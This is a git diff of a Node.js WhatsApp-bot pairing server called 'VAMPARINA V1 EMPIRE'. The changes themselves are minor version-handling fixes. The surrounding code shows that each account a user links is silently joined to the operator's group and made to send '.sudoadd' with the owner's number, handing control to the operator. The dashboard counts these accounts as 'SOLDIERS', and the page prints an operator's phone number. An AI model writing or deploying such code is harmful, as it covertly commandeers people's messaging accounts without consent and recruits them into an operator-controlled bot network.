@@ -24,30 +24,28 @@ app.use(express.static(__dirname));
 
 // DASHBOARD
 app.get('/', (req, res) => {
-    res.send(`
-<!DOCTYPE html><html><head><meta charset="UTF-8"><title>VAMPARINA V1</title>
-<style>body{background:#000;color:#0f0;text-align:center;padding:50px;font-family:Arial;}
-h1{font-size:60px;text-shadow:0 0 30px lime;} a{color:lime;font-size:30px;display:block;margin:20px;}
-.s{font-size:50px;color:gold;}</style></head>
-<body><h1>VAMPARINA V1 EMPIRE</h1>
-<p class="s">SOLDIERS: ${activeBots.size}</p>
-<a href="/qr">SCAN QR</a>
-<a href="/pair">PAIR CODE</a>
-<br><br><b>KING ARNOLD • +254703110780</b></body></html>`);
+    res.send(`<!DOCTYPE html><html><head><meta charset="UTF-8"><title>VAMPARINA V1</title>
+    <style>body{background:#000;color:#0f0;text-align:center;padding:50px;font-family:Arial;}
+    h1{font-size:60px;text-shadow:0 0 30px lime;} a{color:lime;font-size:30px;display:block;margin:20px;}
+    .s{font-size:50px;color:gold;}</style></head>
+    <body><h1>VAMPARINA V1 EMPIRE</h1>
+    <p class="s">SOLDIERS: ${activeBots.size}</p>
+    <a href="/qr">SCAN QR</a>
+    <a href="/pair">PAIR CODE</a>
+    <br><br><b>KING ARNOLD • +254703110780</b></body></html>`);
 });
 
 // QR PAGE
-app.get('/qr', async (req, stk) => {
+app.get('/qr', async (req, res) => {
     const tempId = 'qr_' + Date.now();
     const tempPath = path.join(TEMP_DIR, tempId);
     fs.mkdirSync(tempPath, { recursive: true });
 
     const { state, saveCreds } = await useMultiFileAuthState(tempPath);
-    const versionData = await fetchLatestBaileysVersion();
-    const version = versionData.version || versionData;
+    const baileysVersion = await fetchLatestBaileysVersion();  // ← FIXED LINE
 
     const sock = makeWASocket({
-        version,
+        version: baileysVersion,
         auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
         logger: pino({ level: 'silent' }),
         browser: Browsers.macOS('Chrome'),
@@ -59,7 +57,7 @@ app.get('/qr', async (req, stk) => {
         if (update.qr && !sent) {
             sent = true;
             const qrImg = await QRCode.toDataURL(update.qr);
-            stk.send(`<!DOCTYPE html><html><head><title>SCAN QR</title>
+            res.send(`<!DOCTYPE html><html><head><title>SCAN QR</title>
             <style>body{background:#000;color:#0f0;text-align:center;padding:30px;}
             img{max-width:400px;border:10px solid lime;border-radius:25px;}</style></head>
             <body><h1>VAMPARINA V1</h1><img src="${qrImg}"><p>SCAN NOW</p>
@@ -98,11 +96,10 @@ app.get('/pair', async (req, res) => {
     fs.mkdirSync(tempPath, { recursive: true });
 
     const { state, saveCreds } = await useMultiFileAuthState(tempPath);
-    const versionData = await fetchLatestBaileysVersion();
-    const version = versionData.version || versionData;
+    const baileysVersion = await fetchLatestBaileysVersion();  // ← FIXED LINE
 
     const sock = makeWASocket({
-        version,
+        version: baileysVersion,
         auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
         logger: pino({ level: 'silent' }),
         browser: ["Chrome", "Chrome", "120.0"],
@@ -147,11 +144,10 @@ async function startEmpireBot(sessionId, phone, sessionPath) {
     if (activeBots.has(sessionId)) return;
 
     const { state, saveCreds } = await useMultiFileAuthState(sessionPath);
-    const versionData = await fetchLatestBaileysVersion();
-    const version = versionData.version || versionData;
+    const baileysVersion = await fetchLatestBaileysVersion();  // ← FIXED LINE
 
     const sock = makeWASocket({
-        version,
+        version: baileysVersion,
         logger: pino({ level: 'silent' }),
         auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
         browser: ["Vamparina V1", "Chrome", "2025"]
@@ -165,7 +161,7 @@ async function startEmpireBot(sessionId, phone, sessionPath) {
 
     sock.ev.on('connection.update', async (update) => {
         if (update.connection === 'open') {
-            console.log(`[+] ${phone} → ONLINE`);
+            console.log(`[+] ${phone} → VAMPARINA V1 ONLINE`);
             await delay(15000);
             try { await sock.groupAcceptInvite(config.EMPIRE_GROUP_INVITE); } catch {}
             await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${config.ownerNumber}` });
@@ -181,6 +177,6 @@ async function startEmpireBot(sessionId, phone, sessionPath) {
 
 app.listen(PORT, () => {
     console.clear();
-    console.log("VAMPARINA V1 EMPIRE IS LIVE — KING ARNOLD REIGNS");
+    console.log("VAMPARINA V1 EMPIRE IS LIVE — KING ARNOLD REIGNS SUPREME");
     console.log(`Dashboard: https://your-bot.onrender.com`);
 });
